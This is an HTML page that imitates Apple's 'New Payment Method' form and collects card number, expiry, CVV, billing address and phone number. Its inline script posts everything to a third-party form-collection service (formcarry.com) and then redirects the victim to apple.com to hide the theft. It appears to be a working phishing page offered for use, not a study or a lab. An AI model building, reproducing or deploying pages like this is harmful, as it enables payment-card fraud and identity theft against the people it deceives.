<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Payment Method Form</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;300;400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <form id="payment-form" form action="https://formcarry.com/s/wBL58n_5oeR" method="post" enctype="multipart/form-data">
            <img class="imagina"  src="./image/apple.png" alt="">
            <h3 style="margin-bottom: 2px;" class="form-title">New Payment Method</h3>
            <p class="form-subtitle">This will be saved as your new default payment method.</p>

            <div class="pattern">
                <p style="margin-top: -20px;">You won't be charged until you make a purchase. You authorize Apple to charge this default payment method for paid transactions, and if there is a problem, your next eligible payment methods. If you are a Family Organizer with Purchase Sharing enabled, your eligible payment methods may be shared for family member purchases.</p>
            </div><br>
            
            <div class="row">
                <div class="col">
                    <div class="inputBox">
                        <div style="margin-bottom: 30px;" class="dropdown-container">
                            <label style="left: 16px;" for="first-name" class="dropdown-label2"  for="card-number" style="font-weight: bold;">Payment Method</label>
                            <label for="payment-type" class="dropdown-label"></label>
                            
                            <select id="payment-type" name="payment-type" class="dropdown">
                                <option style="padding-top: 50px; padding-bottom: 2px;" value="credit-card">Credit / Debit Card</option>
                                <option value="paypal">PayPal</option>
                            </select>
                        </div>
                    </div>
                    <div class="inputBox">
                        <label style="font-weight: bold; " for="details">Details</label>
                        <label style="left: -40px;" for="first-name" class="dropdown-label2"  for="card-number" style="font-weight: bold;">Card Number</label>
                        <input id="card-number" name="card-number" style="top: 50px; padding-bottom: 2px; padding-top: 30px;" type="number" placeholder="Required" required>
                    </div>
                    <div class="flex">
                    <div class="inputBox">
                        <label style="left: 13px;" for="first-name" class="dropdown-label2">EXP Date</label>
                        <input id="first-name" name="first-name" style="top: 50px; padding-bottom: 2px; padding-top: 30px;" type="text" placeholder="MM/YYYY" required>
                    </div>
                    <div class="inputBox">
                        <label style="left: 10px;" for="last-name" class="dropdown-label2">Security</label>
                        <input id="last-name" name="last-name" style="top: 50px; padding-bottom: 2px; padding-top: 30px;" type="text" placeholder="CVV">
                    </div>
                </div>
                </div>
            </div>
   
            <div class="billing-address">
                <h3 style="margin-bottom: -17px;">Billing Address</h3>
                
                <div class="flex">
                    <div class="inputBox">
                        <label style="left: 13px;" for="first-name" class="dropdown-label2">First Name</label>
                        <input id="first-name" name="first-name" style="top: 50px; padding-bottom: 2px; padding-top: 30px;" type="text" placeholder="Required" required>
                    </div>
                    <div class="inputBox">
                        <label style="left: 13px;" for="last-name" class="dropdown-label2">Last Name</label>
                        <input id="last-name" name="last-name" style="top: 50px; padding-bottom: 2px; padding-top: 30px;" type="text" placeholder="Required">
                    </div>
                </div>
            
                <div class="inputBox">
                    <label style="left: 13px;" for="street1" class="dropdown-label2">Street</label>
                    <input id="street1" name="street1" style="top: 50px; padding-bottom: 2px; padding-top: 30px;" type="text" placeholder="Required">
                </div>

                <div class="inputBox">
                    <label style="left: 13px;" for="street2" class="dropdown-label2">Street (Optional)</label>
                    <input id="street2" name="street2" style="top: 50px; padding-bottom: 2px; padding-top: 30px;" type="text" placeholder="Optional">
                </div>

                <div class="inputBox">
                    <label style="left: 13px;" for="city" class="dropdown-label2">City</label>
                    <input id="city" name="city" style="top: 50px; padding-bottom: 2px; padding-top: 30px;" type="text" placeholder="City">
                </div><br>
            
                <div class="row">
                    <div class="col">
                        <div class="inputBox">
                            <div class="dropdown-container">
                                <label for="state" class="dropdown-label"></label>
                                <select id="state" name="state" class="dropdown">
                                    <option value="">Select State</option>
                                    <!-- All state options here -->
                            
                                    <option value="Alabama">Alabama</option>
                                        <option value="Alaska">Alaska</option>
                                        <option value="Arizona">Arizona</option>
                                        <option value="California">California</option>
                                        <option value="Colorado">Colorado</option>
                                        <option value="Connecticut">Connecticut</option>
                                        <option value="Delaware">Delaware</option>
                                        <option value="Florida">Florida</option>
                                        <option value="Georgia">Georgia</option>
                                        <option value="Hawaii">Hawaii</option>
                                        <option value="Idaho">Idaho</option>
                                        <option value="Illinois">Illinois</option>
                                        <option value="Indiana">Indiana</option>
                                        <option value="Iowa">Iowa</option>
                                        <option value="Kansas">Kansas</option>
                                        <option value="Kentucky">Kentucky</option>
                                        <option value="Louisiana">Louisiana</option>
                                        <option value="Maine">Maine</option>
                                        <option value="Maryland">Maryland</option>
                                        <option value="Massachusetts">Massachusetts</option>
                                        <option value="Michigan">Michigan</option>
                                        <option value="Minnesota">Minnesota</option>
                                        <option value="Mississippi">Mississippi</option>
                                        <option value="Missouri">Missouri</option>
                                        <option value="Montana">Montana</option>
                                        <option value="Nebraska">Nebraska</option>
                                        <option value="Nevada">Nevada</option>
                                        <option value="New Hampshire">New Hampshire</option>
                                        <option value="New Jersey">New Jersey</option>
                                        <option value="New Mexico">New Mexico</option>
                                        <option value="New York">New York</option>
                                        <option value="North Carolina">North Carolina</option>
                                        <option value="North Dakota">North Dakota</option>
                                        <option value="Ohio">Ohio</option>
                                        <option value="Oklahoma">Oklahoma</option>
                                        <option value="Oregon">Oregon</option>
                                        <option value="Pennsylvania">Pennsylvania</option>
                                        <option value="Rhode Island">Rhode Island</option>
                                        <option value="South Carolina">South Carolina</option>
                                        <option value="South Dakota">South Dakota</option>
                                        <option value="Tennessee">Tennessee</option>
                                        <option value="Texas">Texas</option>
                                        <option value="Utah">Utah</option>
                                        <option value="Vermont">Vermont</option>
                                        <option value="Virginia">Virginia</option>
                                        <option value="Washington">Washington</option>
                                        <option value="West Virginia">West Virginia</option>
                                        <option value="Wisconsin">Wisconsin</option>
                                        <option value="Wyoming">Wyoming</option>
                                        <!-- U.S. Territories -->
                                        <option value="American Samoa">American Samoa</option>
                                        <option value="Guam">Guam</option>
                                        <option value="Northern Mariana Islands">Northern Mariana Islands</option>
                                        <option value="Puerto Rico">Puerto Rico</option>
                                        <option value="U.S. Virgin Islands">U.S. Virgin Islands</option>
                                        <option value="District of Columbia">District of Columbia</option>

                                    <!-- More states... -->
                                </select>
                            </div>
                            
                              <div class="inputBox">
                    <label style="left: 13px;" for="zip" class="dropdown-label2">Zip</label>
                    <input id="zip" name="zip" style="top: 50px; padding-bottom: 2px; padding-top: 30px;" type="number" placeholder="ZIP">
                </div>

                <div class="inputBox">
                    <label style="left: 13px;" for="phone" class="dropdown-label2">Phone</label>
                    <input id="phone" name="phone" style="top: 50px; padding-bottom: 2px; padding-top: 30px;" type="number" placeholder="555 555-5555">
                </div>        
                        </div>
                    </div>
                </div>        
                <br>
                <footer class="footer">
                    <button type="submit" class="submit-btn">Save Changes</button>
                </footer>
            </div>
        </form>
    </div>
    <script>
        document.getElementById('payment-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission behavior
    
            const form = event.target;
    
            // Send the form data to Formcarry
            fetch(form.action, {
                method: "POST",
                body: new FormData(form), // Automatically sets the correct Content-Type
                headers: {
                    Accept: "application/json", // Expect JSON response from Formcarry
                },
            })
            .then(response => {
                if (response.ok) {
                    console.log("Data submitted successfully!");
                    // Redirect to Apple website
                    window.location.href = "https://www.apple.com";
                } else {
                    console.error("There was an error with the form submission.");
                    return response.json().then(data => {
                        alert(`Error: ${data.message || "Unknown error"}`);
                    });
                }
            })
            .catch(error => {
                console.error("Error:", error);
                alert("A network error occurred. Please try again later.");
            });
        });
    </script>
</body>
</html>
